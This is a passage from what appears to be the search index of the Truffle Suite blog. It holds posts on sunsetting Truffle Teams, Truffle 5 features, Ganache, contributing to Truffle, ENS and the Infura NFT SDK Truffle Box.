your data before this time, otherwise we'll be unable to recover it. The afterlife is open-source \u00b6 Parts of Truffle Teams will be making their way into our open-source tools! We're happy to share one right now--repackaging the visual debugger as a plugin that allows you to launch an instance from within Truffle. Truffle Teams provided greater context around your dapps activity thanks to its GUI. Being able to pull up a list of transactions from a Ganache instance, filter by failures, and clicking a debug button was one of the better workflows that we're proud to integrate with our open-source suite. These repurposed bits will all be open-source, so you can check out the truffle-plugin-debugger repository here. The Truffle Teams visual debugger--coming to Truffle! If there are other features you'd like to see again, for example the deployments screen or contract manager, let us know! Sincerely, The Truffle Suite Team", "title": "Sunsetting Truffle Teams"}, {"location": "blog/sunsetting-truffle-teams/#what-about-paid-subscribers", "text": "All active Pro and Enterprise tier users will receive a refund of 1 month and recurring billings will cease. If you don't see a refund within 5 days (Paddle's processing time), email us at truffle-teams@trufflesuite.com .", "title": "What about paid subscribers?"}, {"location": "blog/sunsetting-truffle-teams/#what-about-my-data", "text": "All user data will be deleted 30 days following the date of shut down (September 10th 2021). Be sure to request your data before this time, otherwise we'll be unable to guarantee recovery. If you would like a dump of your data, email us at truffle-teams@trufflesuite.com . All user data will be deleted on September 10th, 2021. Make sure to request your data before this time, otherwise we'll be unable to recover it.", "title": "What about my data?"}, {"location": "blog/sunsetting-truffle-teams/#the-afterlife-is-open-source", "text": "Parts of Truffle Teams will be making their way into our open-source tools! We're happy to share one right now--repackaging the visual debugger as a plugin that allows you to launch an instance from within Truffle. Truffle Teams provided greater context around your dapps activity thanks to its GUI. Being able to pull up a list of transactions from a Ganache instance, filter by failures, and clicking a debug button was one of the better workflows that we're proud to integrate with our open-source suite. These repurposed bits will all be open-source, so you can check out the truffle-plugin-debugger repository here. The Truffle Teams visual debugger--coming to Truffle! If there are other features you'd like to see again, for example the deployments screen or contract manager, let us know! Sincerely, The Truffle Suite Team", "title": "The afterlife is open-source"}, {"location": "blog/take-a-dive-into-truffle-5/", "text": "Truffle 5 has had some exciting releases in the flexibilty they provide to your workflow. \ud83c\udf0a Truffle now offers the ability to detect the version of Solidity in your contracts at compile time and allows for compilation from ABI files. Because of this, wrangling a project whose contracts use multiple version of Solidity is much easier going forward. We've also enhanced our testing capabilities with Solidity strack traces and better event decoding, making it much easier to get to the source of an error and get richer information from events. When our projects integrate with existing protocols, it's a pain to have to deal with those external contracts. Now Truffle makes this easy with the ability to fetch external contracts verified on Etherscan! Vyper support continues to improve with experimental debugging for Vyper contracts, as well as improved import handling for Vyper. Did I mention support for decentralized file storage ? What's New in 5.2 and 5.3 \u00b6 IPFS, Filecoin, and Textile Bucket support via truffle preserve \u00b6 Tests have ran, bugs are squashed, your smart contracts have been deployed successfully to mainnet; life is good. It's time to make your dapp accessible to the masses! So you... go to a centralized host and spin up the frontend? Something's definitely off here. Enter truffle preserve : You can now use Truffle to upload your static assets to IPFS , Filecoin , and/or Textile Buckets for a fully decentralized application across the entire stack! Here are some companion pieces to help you get started: - The Filecoin Truffle Box includes a decentralized art gallery to get you started with a fully working project! - The original Filecoin + Truffle & Ganache Blog Post - truffle preserve Documentation Unbox a decentralized art gallery with the Filecoin Truffle Box. Pragma compilation \u00b6 As of version 5.2.0, Truffle now ships with a fun, experimental setting for compilation: the \u201cpragma\u201d setting. This feature analyzes your Solidity source files for their pragma expressions. It then uses these expressions to figure out which version of the Solidity compiler is required for each given source. This allows your project to compile when it contains multiple Solidity files, each requiring a different version of the Solidity compiler! To use this feature, set the Solidity compiler version field in your truffle-config.js as follows: module . exports = { compilers : { solc : { version : \u201c pragma \u201d } }, // \u2026 the rest of your config goes here }; Now you can run truffle compile and your project will compile! To illustrate this feature and the ones below, we have created a Truffle box for Truffle 5.2 . In this box you can see how the truffle-config.js is set up to use this new experimental feature. Notice that contracts/MetaCoin.sol requires ^0.7.0 and how contracts/Conversion.sol requires ^0.6.0 . When running truffle compile on this example project you should get a printout of all the versions of the Solidity compiler used during compilation. Namely, you should see that both version 0.6.12 and 0.7.6 are listed. When you use this feature, Truffle will analyze each of your Solidity sources one by one to find the appropriate version of the Solidity compiler for each source. Do note, however, that each source file and all of its imports must be compiled with one version of Solidity; this means there must be a version of the compiler that satisfies all of their pragma expressions. Things you may have missed in Truffle 5.1 \u00b6 We\u2019ve added a fair bit over the course of Truffle 5.1 as well, and there\u2019s a good chance you didn\u2019t catch all of it! We thought this would be a good time to review some of that as well! Compilation of abi.json files \u00b6 Another exciting addition to Truffle is the ability to compile from a contract\u2019s ABI. When you create a JSON source file in your \u201ccontracts\u201d directory that contains a contract\u2019s ABI, Truffle will take it, use it to create an interface, and compile it. This might come in handy, for example, when you want to import and use a library that requires a different version of the Solidity compiler than the importing file. You can then simply compile the library and create a new JSON file containing the ABI of the imported library. Under the hood Truffle will compile the ABI into a Solidity interface and create an artifact for it. You will then be able to import the interface into your contract! In the v5.2-example-box, consider the contracts/MetaCoin.sol and contracts/Conversion.sol . We would like to import Conversion into the MetaCoin contract to use it but cannot since they require different versions of the Solidity compiler. To work around this, we have created contracts/IConversion.abi.json which contains the ABI from the compiled Conversion. In this way we can now import the interface into contracts/MetaCoin.sol (see line 4 in the MetaCoin contract) to use it! Solidity stacktraces in Truffle Test \u00b6 Try running your tests with the --stacktrace option (or -t for short) and get combined Solidity-Javascript stacktraces! This feature does have some limitations and is still somewhat experimental, but we expect you\u2019ll find it quite useful. In the future we may add support for Vyper stacktraces as well! And speaking of Vyper... Experimental Vyper debugging \u00b6 You can now use Truffle Debugger with Vyper! Support for this is still in its early stages; you won\u2019t be able to inspect variables, I\u2019m afraid. But you can step through a Vyper transaction, and there will likely be more in the future! But perhaps the biggest improvement to the debugger is... Debugging verified external contracts \u00b6 Use the --fetch-external (or -x for short) option with Truffle Debugger and it will automatically download sources for any verified contracts and allow you to step through them! Contracts can be verified on either Etherscan or Sourcify. You no longer need to download these yourself and add them to your Truffle project! You can see this earlier post for more information. Improved import handling in Vyper \u00b6 Here\u2019s another one for our Vyper users; you can now do imports from other projects (via NPM or EthPM) just like in Solidity! For instance, suppose examplepackage is an NPM package which is structured as a Truffle project, and you want to import a Vyper contract, VyperContract , from it. You can now do from examplepackage.contracts import VyperContract or import examplepackage.contracts.VyperContract as VyperContract to import it, much like you could do in Solidity! Note that if your own project uses such \u201cabsolute\u201d imports as a way to import its own files from the project root -- e.g., if you have a file contracts/subdirectory/Contract1.vy which imports contracts/Contract2.vy via import Contract2 as Contract2 then this will work within your own project, but won\u2019t work if other people try to import your Contract1 . We suggest that if you want other people to import contracts from your project, you use explicitly relative imports instead: from .. import Contract2 But such imports are now possible. We hope you\u2019ll find all sorts of uses for this! Enumeration values in Truffle Contract objects \u00b6 When sending a transaction that takes an enum , it\u2019s inconvenient to have to look up the numeric constants that the enum uses. Well, now, each Truffle Contract constructor object contains enumeration constants, so you don\u2019t need to do that. Just do contractInstance . exampleMethod ( Contract . ExampleEnum . EnumValue ); and don\u2019t worry about the particular numeric value of EnumValue . You can also do Contract.enums.ExampleEnum.EnumValue , if you want to be extra-certain. Note that it\u2019s not currently possible to access enums declared outside of a contract this way, but we have plans in the future to make using those easier, too! Even more! \u00b6 Other things you might have missed include: Improved event decoding in truffle test ; being able to use the debugger to step through Yul (assembly) sources generated by Solidity for its own internal subroutines (try the g command!); being able to inspect assembly variables in the debugger; truffle test --bail ; truffle create all ; and the debugger providing more information upon transaction reversion. What's Next? Want to Help us Build it? \u00b6 How will you use the new enhancements in Truffle? Let us know what you think about these features on Twitter, and if you have other needs we haven\u2019t met yet. WE'RE HIRING! Why stop at feature requests--cut out the middleman and work with us directly! There are many exciting problems to solve like layer 2 support, mapping decoding, and a revamped deployment system, to name a few. We'd love your help and perspective. Apply here on ConsenSys' website!", "title": "Take a Dive into Truffle 5"}, {"location": "blog/take-a-dive-into-truffle-5/#whats-new-in-52-and-53", "text": "", "title": "What's New in 5.2 and 5.3"}, {"location": "blog/take-a-dive-into-truffle-5/#ipfs-filecoin-and-textile-bucket-support-via-truffle-preserve", "text": "Tests have ran, bugs are squashed, your smart contracts have been deployed successfully to mainnet; life is good. It's time to make your dapp accessible to the masses! So you... go to a centralized host and spin up the frontend? Something's definitely off here. Enter truffle preserve : You can now use Truffle to upload your static assets to IPFS , Filecoin , and/or Textile Buckets for a fully decentralized application across the entire stack! Here are some companion pieces to help you get started: - The Filecoin Truffle Box includes a decentralized art gallery to get you started with a fully working project! - The original Filecoin + Truffle & Ganache Blog Post - truffle preserve Documentation Unbox a decentralized art gallery with the Filecoin Truffle Box.", "title": "IPFS, Filecoin, and Textile Bucket support via truffle preserve"}, {"location": "blog/take-a-dive-into-truffle-5/#pragma-compilation", "text": "As of version 5.2.0, Truffle now ships with a fun, experimental setting for compilation: the \u201cpragma\u201d setting. This feature analyzes your Solidity source files for their pragma expressions. It then uses these expressions to figure out which version of the Solidity compiler is required for each given source. This allows your project to compile when it contains multiple Solidity files, each requiring a different version of the Solidity compiler! To use this feature, set the Solidity compiler version field in your truffle-config.js as follows: module . exports = { compilers : { solc : { version : \u201c pragma \u201d } }, // \u2026 the rest of your config goes here }; Now you can run truffle compile and your project will compile! To illustrate this feature and the ones below, we have created a Truffle box for Truffle 5.2 . In this box you can see how the truffle-config.js is set up to use this new experimental feature. Notice that contracts/MetaCoin.sol requires ^0.7.0 and how contracts/Conversion.sol requires ^0.6.0 . When running truffle compile on this example project you should get a printout of all the versions of the Solidity compiler used during compilation. Namely, you should see that both version 0.6.12 and 0.7.6 are listed. When you use this feature, Truffle will analyze each of your Solidity sources one by one to find the appropriate version of the Solidity compiler for each source. Do note, however, that each source file and all of its imports must be compiled with one version of Solidity; this means there must be a version of the compiler that satisfies all of their pragma expressions.", "title": "Pragma compilation"}, {"location": "blog/take-a-dive-into-truffle-5/#things-you-may-have-missed-in-truffle-51", "text": "We\u2019ve added a fair bit over the course of Truffle 5.1 as well, and there\u2019s a good chance you didn\u2019t catch all of it! We thought this would be a good time to review some of that as well!", "title": "Things you may have missed in Truffle 5.1"}, {"location": "blog/take-a-dive-into-truffle-5/#compilation-of-abijson-files", "text": "Another exciting addition to Truffle is the ability to compile from a contract\u2019s ABI. When you create a JSON source file in your \u201ccontracts\u201d directory that contains a contract\u2019s ABI, Truffle will take it, use it to create an interface, and compile it. This might come in handy, for example, when you want to import and use a library that requires a different version of the Solidity compiler than the importing file. You can then simply compile the library and create a new JSON file containing the ABI of the imported library. Under the hood Truffle will compile the ABI into a Solidity interface and create an artifact for it. You will then be able to import the interface into your contract! In the v5.2-example-box, consider the contracts/MetaCoin.sol and contracts/Conversion.sol . We would like to import Conversion into the MetaCoin contract to use it but cannot since they require different versions of the Solidity compiler. To work around this, we have created contracts/IConversion.abi.json which contains the ABI from the compiled Conversion. In this way we can now import the interface into contracts/MetaCoin.sol (see line 4 in the MetaCoin contract) to use it!", "title": "Compilation of abi.json files"}, {"location": "blog/take-a-dive-into-truffle-5/#solidity-stacktraces-in-truffle-test", "text": "Try running your tests with the --stacktrace option (or -t for short) and get combined Solidity-Javascript stacktraces! This feature does have some limitations and is still somewhat experimental, but we expect you\u2019ll find it quite useful. In the future we may add support for Vyper stacktraces as well! And speaking of Vyper...", "title": "Solidity stacktraces in Truffle Test"}, {"location": "blog/take-a-dive-into-truffle-5/#experimental-vyper-debugging", "text": "You can now use Truffle Debugger with Vyper! Support for this is still in its early stages; you won\u2019t be able to inspect variables, I\u2019m afraid. But you can step through a Vyper transaction, and there will likely be more in the future! But perhaps the biggest improvement to the debugger is...", "title": "Experimental Vyper debugging"}, {"location": "blog/take-a-dive-into-truffle-5/#debugging-verified-external-contracts", "text": "Use the --fetch-external (or -x for short) option with Truffle Debugger and it will automatically download sources for any verified contracts and allow you to step through them! Contracts can be verified on either Etherscan or Sourcify. You no longer need to download these yourself and add them to your Truffle project! You can see this earlier post for more information.", "title": "Debugging verified external contracts"}, {"location": "blog/take-a-dive-into-truffle-5/#improved-import-handling-in-vyper", "text": "Here\u2019s another one for our Vyper users; you can now do imports from other projects (via NPM or EthPM) just like in Solidity! For instance, suppose examplepackage is an NPM package which is structured as a Truffle project, and you want to import a Vyper contract, VyperContract , from it. You can now do from examplepackage.contracts import VyperContract or import examplepackage.contracts.VyperContract as VyperContract to import it, much like you could do in Solidity! Note that if your own project uses such \u201cabsolute\u201d imports as a way to import its own files from the project root -- e.g., if you have a file contracts/subdirectory/Contract1.vy which imports contracts/Contract2.vy via import Contract2 as Contract2 then this will work within your own project, but won\u2019t work if other people try to import your Contract1 . We suggest that if you want other people to import contracts from your project, you use explicitly relative imports instead: from .. import Contract2 But such imports are now possible. We hope you\u2019ll find all sorts of uses for this!", "title": "Improved import handling in Vyper"}, {"location": "blog/take-a-dive-into-truffle-5/#enumeration-values-in-truffle-contract-objects", "text": "When sending a transaction that takes an enum , it\u2019s inconvenient to have to look up the numeric constants that the enum uses. Well, now, each Truffle Contract constructor object contains enumeration constants, so you don\u2019t need to do that. Just do contractInstance . exampleMethod ( Contract . ExampleEnum . EnumValue ); and don\u2019t worry about the particular numeric value of EnumValue . You can also do Contract.enums.ExampleEnum.EnumValue , if you want to be extra-certain. Note that it\u2019s not currently possible to access enums declared outside of a contract this way, but we have plans in the future to make using those easier, too!", "title": "Enumeration values in Truffle Contract objects"}, {"location": "blog/take-a-dive-into-truffle-5/#even-more", "text": "Other things you might have missed include: Improved event decoding in truffle test ; being able to use the debugger to step through Yul (assembly) sources generated by Solidity for its own internal subroutines (try the g command!); being able to inspect assembly variables in the debugger; truffle test --bail ; truffle create all ; and the debugger providing more information upon transaction reversion.", "title": "Even more!"}, {"location": "blog/take-a-dive-into-truffle-5/#whats-next-want-to-help-us-build-it", "text": "How will you use the new enhancements in Truffle? Let us know what you think about these features on Twitter, and if you have other needs we haven\u2019t met yet. WE'RE HIRING! Why stop at feature requests--cut out the middleman and work with us directly! There are many exciting problems to solve like layer 2 support, mapping decoding, and a revamped deployment system, to name a few. We'd love your help and perspective. Apply here on ConsenSys' website!", "title": "What's Next? Want to Help us Build it?"}, {"location": "blog/take-control-of-your-deployments-with-truffle-teams/", "text": "If you read our blog post back in July , attended my TruffleCon workshop Push It! Push It Real Good: Truffle Teams Intro & Deployments back in August, or tuned in last week to our Truffle Teams Overview webinar, you've known something awesome has been in the works for Truffle Teams. Well it's finally here! On behalf of the whole team, I'm excited to announce Deployments within Truffle Teams! Bridging the Gap Between Local Ganache Testing and Public Testnet/Mainnet Deployments \u00b6 The interaction between Truffle and Ganache provides an awesome way to iteratively test and fix contracts on a personal Ethereum blockchain. However, it can be a little tricky when you're ready to publish your application to the rest of the world. That's where Truffle Teams Deployments comes in: we give you a dead-simple deployment experience which links with MetaMask so you never need to export your private keys. Benefits of Deploying with Truffle Teams \u00b6 Easily deploy to public Ethereum networks (Mainnet, Ropsten, G\u00f6rli, Rinkeby, and Kovan are supported) Works with the existing migration scripts in your Truffle project; Truffle Teams uses truffle migrate under the hood No need to export/import private keys \u2014 use MetaMask to deploy like you would with any other dapp Deploy with Ledger or Trezor hardware wallets within MetaMask Learn More in Our Tutorial or Try It Now! \u00b6 We put together a step-by-step tutorial to guide you through your first Truffle Teams deployment. While we recommend that you follow the tutorial (as it answers some FAQs), the deployment experience is simple enough for you to just give it a shot! \ud83d\udc47 Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams", "title": "Take Control of Your Deployments with Truffle Teams"}, {"location": "blog/take-control-of-your-deployments-with-truffle-teams/#bridging-the-gap-between-local-ganache-testing-and-public-testnetmainnet-deployments", "text": "The interaction between Truffle and Ganache provides an awesome way to iteratively test and fix contracts on a personal Ethereum blockchain. However, it can be a little tricky when you're ready to publish your application to the rest of the world. That's where Truffle Teams Deployments comes in: we give you a dead-simple deployment experience which links with MetaMask so you never need to export your private keys.", "title": "Bridging the Gap Between Local Ganache Testing and Public Testnet/Mainnet Deployments"}, {"location": "blog/take-control-of-your-deployments-with-truffle-teams/#benefits-of-deploying-with-truffle-teams", "text": "Easily deploy to public Ethereum networks (Mainnet, Ropsten, G\u00f6rli, Rinkeby, and Kovan are supported) Works with the existing migration scripts in your Truffle project; Truffle Teams uses truffle migrate under the hood No need to export/import private keys \u2014 use MetaMask to deploy like you would with any other dapp Deploy with Ledger or Trezor hardware wallets within MetaMask", "title": "Benefits of Deploying with Truffle Teams"}, {"location": "blog/take-control-of-your-deployments-with-truffle-teams/#learn-more-in-our-tutorial-or-try-it-now", "text": "We put together a step-by-step tutorial to guide you through your first Truffle Teams deployment. While we recommend that you follow the tutorial (as it answers some FAQs), the deployment experience is simple enough for you to just give it a shot! \ud83d\udc47 Get started with Truffle Teams, and see deployments for yourself! Try Truffle Teams", "title": "Learn More in Our Tutorial or Try It Now!"}, {"location": "blog/testrpc-is-now-ganache/", "text": "Have you been looking for the TestRPC recently and haven't been able to find it? Don't worry, it's still here! It's just now known as Ganache . Ganache comes in two flavors: a fully-interactive development blockchain with a graphical interface, and the more familiar command-line version. Get the graphical version here . For the command-line version (known as Ganache CLI ): npm install -g ganache-cli A little history \u00b6 Prior to the existence of the TestRPC, you would have to deploy to private internal test networks to see how your contract code operated (as public test networks like Ropsten didn't yet exist!). While initially under the auspices of the EthereumJS project , it was originally created by the Truffle team, and today we remain its primary maintainers. So simply for maintainability sake, it just made sense to bring the TestRPC under Truffle's wing. Additionally, we realized over time that the TestRPC was a poor name. The TestRPC quickly became more powerful than simply a blockchain environment used for testing. To stay with the sweet Truffle brand, we decided to rename it Ganache, as Ganache is (often) the core of your favorite chocolate truffle. It's a much catchier name (and a much tastier one too). Multiple ways to enjoy \u00b6 With this name change, we also released a fully-interactive, graphical version of Ganache . The command-line utility is still available via NPM; the command line flags are the same too. All that's changed is the name of the command. Ganache is also available as a library for your applications. See the README for more details. So now you have multiple ways to create a personal blockchain. If you're looking for a blockchain with a graphical environment that's perfect for beginners, check out Ganache . And if you want the familiar command-line interface, install Ganache CLI. Happy developing!", "title": "TestRPC is now Ganache"}, {"location": "blog/testrpc-is-now-ganache/#a-little-history", "text": "Prior to the existence of the TestRPC, you would have to deploy to private internal test networks to see how your contract code operated (as public test networks like Ropsten didn't yet exist!). While initially under the auspices of the EthereumJS project , it was originally created by the Truffle team, and today we remain its primary maintainers. So simply for maintainability sake, it just made sense to bring the TestRPC under Truffle's wing. Additionally, we realized over time that the TestRPC was a poor name. The TestRPC quickly became more powerful than simply a blockchain environment used for testing. To stay with the sweet Truffle brand, we decided to rename it Ganache, as Ganache is (often) the core of your favorite chocolate truffle. It's a much catchier name (and a much tastier one too).", "title": "A little history"}, {"location": "blog/testrpc-is-now-ganache/#multiple-ways-to-enjoy", "text": "With this name change, we also released a fully-interactive, graphical version of Ganache . The command-line utility is still available via NPM; the command line flags are the same too. All that's changed is the name of the command. Ganache is also available as a library for your applications. See the README for more details. So now you have multiple ways to create a personal blockchain. If you're looking for a blockchain with a graphical environment that's perfect for beginners, check out Ganache . And if you want the familiar command-line interface, install Ganache CLI. Happy developing!", "title": "Multiple ways to enjoy"}, {"location": "blog/the-best-ways-to-contribute-to-truffle/", "text": "Have you ever thought about contributing to Truffle? All of us at Truffle really enjoy producing free and open source software, and it is especially fun when many of you in the community contribute. User contributions make life easier for us, make our work more enjoyable by showing that you\u2019re engaged, and often give us a chance to learn from those that offer code to the project. We\u2019d absolutely love any and all developers to contribute to our project. The following are a few ways that you can get involved. Read the contributor guidelines. \u00b6 The first step anyone should take before contributing to Truffle is to hop on over to our Github page and read our contributing guidelines . Our contributing guidelines will give you a baseline understanding of how Truffle is built, which tools to use during development, and other useful information to get you started. Make sure to read those guidelines before continuing on in this post. Follow the command flow. \u00b6 You\u2019ll see that the contributing guidelines focus on the command flow. This is because at its core, Truffle is a command line tool that processes and runs specific commands on behalf of a user. If you can figure out where a command starts, you can follow its execution to get a better understanding of what Truffle is doing. We recommend choosing your favorite command and following its path through the code. We\u2019d also recommend performing your own local experiments by changing the behavior of a specific command and seeing how it behaves. Don\u2019t forget to read the contributing guidelines above, as it tells you where to get started for each command. Change callbacks to Promises. \u00b6 Given the lifetime of the project -- over four years! -- Truffle has its share of legacy code. Before Promises became widespread in the Node world, callbacks were used to control the flow of asynchronous code within Truffle. The code was written in a style where a callback function was passed from one method to the next, intended to be executed after everything else had finished running or when an error occurred. Nowadays, many people find this style of code to be abstruse, and hard to understand, and now favor Promises over callbacks. We do too. One of our major tasks over the coming year is to rework our code to favor a Promise-based coding style instead of a callback-based one. We are always interested in receiving PRs that clean up our callbacks and make the code easier to understand for everyone (we love you async/await). Start small, and chat with us for larger tasks. \u00b6 It can be very overwhelming to begin contributing to Truffle with a big feature. Instead, we recommend going after a smaller, more bite-sized change that will not only make you feel more successful, but can also help you get a better understanding of the underlying code. If you find something trivial, like a documentation error, go ahead and fork the repository, make your changes, and submit a pull request. For something bigger, we like to have a discussion first as our tools support many different use cases and platforms. If you have a great idea for a change that will require significant effort, we recommend filing a GitHub issue with a proposal or contacting us using the channels below. We can layout specs, bounce ideas around, and agree on what\u2019s needed before you dive in. Tackle an issue. \u00b6 Many of our users submit issues for things that need to be fixed. Sometimes these issues are small bugs that have been able to hide in the cracks. Other times they can be large changes or feature requests that require significant effort to fix. Regardless of your appetite, our issues list is often a great place to start for people to contribute. Due to the nature of software, you\u2019re bound to find an issue that\u2019s right for you. And even if you don\u2019t think you can fix an issue, confirming that issues exist and giving us extra information can be extremely helpful. Often the biggest factor keeping a sneaky bug alive is information, so validating an issue exists and providing more data can help us squash that bug even faster. Contact us. \u00b6 As always, we\u2019d love to hear your feedback and concerns, as well as answer any questions you have when contributing to Truffle. Feel free to reach out to us and file an issue on Github . We'd love to hear from you. Happy Truffling!", "title": "The Best Ways to Contribute to Truffle"}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#read-the-contributor-guidelines", "text": "The first step anyone should take before contributing to Truffle is to hop on over to our Github page and read our contributing guidelines . Our contributing guidelines will give you a baseline understanding of how Truffle is built, which tools to use during development, and other useful information to get you started. Make sure to read those guidelines before continuing on in this post.", "title": "Read the contributor guidelines."}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#follow-the-command-flow", "text": "You\u2019ll see that the contributing guidelines focus on the command flow. This is because at its core, Truffle is a command line tool that processes and runs specific commands on behalf of a user. If you can figure out where a command starts, you can follow its execution to get a better understanding of what Truffle is doing. We recommend choosing your favorite command and following its path through the code. We\u2019d also recommend performing your own local experiments by changing the behavior of a specific command and seeing how it behaves. Don\u2019t forget to read the contributing guidelines above, as it tells you where to get started for each command.", "title": "Follow the command flow."}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#change-callbacks-to-promises", "text": "Given the lifetime of the project -- over four years! -- Truffle has its share of legacy code. Before Promises became widespread in the Node world, callbacks were used to control the flow of asynchronous code within Truffle. The code was written in a style where a callback function was passed from one method to the next, intended to be executed after everything else had finished running or when an error occurred. Nowadays, many people find this style of code to be abstruse, and hard to understand, and now favor Promises over callbacks. We do too. One of our major tasks over the coming year is to rework our code to favor a Promise-based coding style instead of a callback-based one. We are always interested in receiving PRs that clean up our callbacks and make the code easier to understand for everyone (we love you async/await).", "title": "Change callbacks to Promises."}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#start-small-and-chat-with-us-for-larger-tasks", "text": "It can be very overwhelming to begin contributing to Truffle with a big feature. Instead, we recommend going after a smaller, more bite-sized change that will not only make you feel more successful, but can also help you get a better understanding of the underlying code. If you find something trivial, like a documentation error, go ahead and fork the repository, make your changes, and submit a pull request. For something bigger, we like to have a discussion first as our tools support many different use cases and platforms. If you have a great idea for a change that will require significant effort, we recommend filing a GitHub issue with a proposal or contacting us using the channels below. We can layout specs, bounce ideas around, and agree on what\u2019s needed before you dive in.", "title": "Start small, and chat with us for larger tasks."}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#tackle-an-issue", "text": "Many of our users submit issues for things that need to be fixed. Sometimes these issues are small bugs that have been able to hide in the cracks. Other times they can be large changes or feature requests that require significant effort to fix. Regardless of your appetite, our issues list is often a great place to start for people to contribute. Due to the nature of software, you\u2019re bound to find an issue that\u2019s right for you. And even if you don\u2019t think you can fix an issue, confirming that issues exist and giving us extra information can be extremely helpful. Often the biggest factor keeping a sneaky bug alive is information, so validating an issue exists and providing more data can help us squash that bug even faster.", "title": "Tackle an issue."}, {"location": "blog/the-best-ways-to-contribute-to-truffle/#contact-us", "text": "As always, we\u2019d love to hear your feedback and concerns, as well as answer any questions you have when contributing to Truffle. Feel free to reach out to us and file an issue on Github . We'd love to hear from you. Happy Truffling!", "title": "Contact us."}, {"location": "blog/the-blockchain-problem-that-ens-solves/", "text": "The blockchain world has a UI problem. This is what an Ethereum receiving address looks like: 0xfB6916095ca1df60bB79Ce92cE3Ea74c37c5d359 Bitcoin and other cryptocurrencies have the same problem, as do related decentralized projects like IPFS. The computer-generated address system works great for computers but isn\u2019t user-friendly. This isn\u2019t a new problem. The nascent Internet had a similar issue with IP addresses. For the Internet to eventually be used by millions and now billions of regular users, it needed a way to mask the machine-readable identifiers. So, in 1985, the \u201cphone book of the Internet,\u201d the Domain Name System (DNS), was born. While the DNS is used by many protocols, the World Wide Web really took the DNS mainstream. Can you imagine the web if users had to type in \u201c72.125.224.72\u201d rather than \u201cgoogle.com\u201d? The blockchain world needs the same thing. We could use the existing DNS, but it\u2019s a relatively centralized server architecture which makes it unattractive for blockchain applications. That\u2019s where the Ethereum Name Service (ENS) comes in. ENS provides the same basic functionality of DNS (look up the records for \u201cexample.tld,\u201d retrieve information), but replaces the hierarchical DNS server system with a few smart contracts on Ethereum. ENS is the naming service of the new decentralized Internet - with less infrastructure, better security, and of course less centralized control. ENS launched in 2017 with the native TLD.ETH, but we\u2019ve been experimenting with allowing owners of DNS domains to use their domains on ENS and have successfully done this with .XYZ and .LUXE domains. We plan on rolling out this capability to most other TLDs later this year. We want to make it as easy as possible for dapp developers to take advantage of the big UI gains that ENS provides, which is why we\u2019re working with Truffle. We are excited to be announcing several useful ENS integrations built into TruffleSuite at TruffleCon, so stay tuned! Register your domain name using ENS today! Helpful Links: * Website: https://ens.domains/ * Manager: https://manager.ens.domains/ * Docs: https://docs.ens.domains/ * Gitter: https://gitter.im/ethereum/go-ethereum/name-registry * Forum: https://discuss.ens.domains/", "title": "The Blockchain UI Problem that ENS Solves"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/", "text": "By Kingsley Arinze Infura announced the private beta release of their NFT API a few months ago. Since then, there has been an ecosystem of tools developing around it, making it easier to build with Infura\u2019s NFT API . One such tool is the The Infura NFT SDK Truffle Box , which as you\u2019ll see later in this post, utilizes another tool built on top of the Infura NFT API, the Infura NFT SDK , to make NFT development as stress-free as possible. In this post, we will discuss the Infura NFT API, as well as the Infura NFT SDK which is available for download as an NPM package . We\u2019ll then explore the Infura NFT SDK Truffle Box and how it makes NFT development a lot easier by providing the necessary configuration and boilerplate code needed to build a complete NFT project. Infura NFT API, what is it? \u00b6 In the past year, we\u2019ve seen a significant increase in cryptocurrency adoption across the world, which is in part, a result of the NFT boom of the past year. As a matter of fact, there is an estimated 880% increase in global crypto adoption in 2021, a $180 billion market capitalization for stablecoins as of March 2022 as well as a $70 billion market capitalization for NFTs as of September 2022. We\u2019ve also seen a number of popular brands like Coca-Cola, Adidas, Nike, and Formula 1 to name a few, launch NFTs and invest in the Metaverse. All this points to the fact that NFTs are an important part of our ecosystem and their use cases aren\u2019t just limited to PFPs or artwork, but extend to include digital identity verification, membership/access to gated digital and physical communities, and much more. Infura and Truffle understand the importance of NFTs and where it is headed, which is why we've expanded our product offering to include the NFT API , a set of RESTful APIs that enable developers to: Fetch all or specific NFTs for an account Verify ownership of an NFT or a collection Get the creator and transfer history of NFT or a collection And other important metadata Infura NFT SDK, what is it? \u00b6 The Infura NFT SDK is basically a wrapper around the Infura NFT API, exposed as a JavaScript library and available for download on NPM . This library, in addition to being able to make RESTful calls to all of Infura\u2019s NFT API endpoints, allows you to deploy and call methods on common Ethereum smart-contract definitions through Infura, without the developer overhead of learning Solidity, compiling code, and importing ABI\u2019s. For a detailed description of how to use the SDK for deploying an NFT, minting and transferring an NFT, and fetching NFT metadata, please refer to the how-to section of the Infura NFT API documentation. The Infura NFT SDK Truffle Box \u00b6 To further simplify the developer experience for NFT developers and creators using the Infura NFT API and the SDK, Truffle is happy to announce the release of the Infura NFT SDK Truffle Box , a set of boilerplate code that enables NFT developers, using Truffle, to take their ideas from concept to reality, as quickly as possible, by allowing them to focus on the most important and unique parts of their projects, while taking care of all other aspects such as project configuration and deployment. Installation and setup \u00b6 To use the Infura NFT SDK Truffle Box, you have to meet the following requirements: Access to the Infura NFT API as it is still in private beta. Join the waitlist here Node.js 10.x or later NPM version 5.2 or later Windows, Linux, or macOS An Infura account and Project ID, together with the Project Secret Key A MetaMask account Once these requirements are met, in an empty folder, run the unbox command as shown below: npx truffle unbox infura-nft-sdk This should download and unbox the Infura NFT SDK Box. Next download all project dependencies by running npm install . With all dependencies successfully installed, proceed to creating a .env file in the root of your project, followed by adding values for the following environment variables: REACT_APP_INFURA_PROJECT_ID = your-project-id REACT_APP_INFURA_PROJECT_SECRET = your-project-secret REACT_APP_IPFS_GATEWAY = your-ipfs-gateway Start the project \u00b6 We\u2019ve included a basic user interface that enable you to perform some actions as you will see shortly. Switch to the client directory of the box and run npm start to start the project. On your browser, navigate to http://localhost:3000 to view your application and connect your wallet. How it works \u00b6 Once you've started the application, notice that on the left hand side, there are links to perform actions like deploying an NFT contract, Loading a deployed NFT contract, Minting and setting royalty for an NFT, and viewing your minted NFT collection. Let's delve deeper into these actions: Deploy a new NFT contract: using the Add New Contract link, you can deploy a new NFT contract by first choosing a template, which is a way of telling Infura what underlying smart contract to use. At the moment, there is only one option which is an ERC721 contract but as time goes on, more options will be added. Once you've selected a template, you'll be prompted to provide the contract name, symbol and URI - link to your NFT 